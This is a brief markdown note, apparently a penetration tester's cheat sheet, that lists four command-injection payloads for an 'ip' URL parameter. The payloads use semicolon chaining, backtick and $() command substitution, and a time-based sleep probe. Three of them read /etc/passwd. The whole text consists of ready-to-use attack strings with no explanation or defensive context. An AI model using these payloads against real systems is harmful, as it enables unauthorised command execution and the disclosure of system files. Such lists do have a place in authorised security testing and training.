## Command Injection Random Notes

- /?ip=127.0.0.1;cat /etc/passwd
- /?ip=`cat /etc/passwd`
- /?ip=$(cat /etc/passwd)
- /?ip=127.0.0.1$(sleep 20)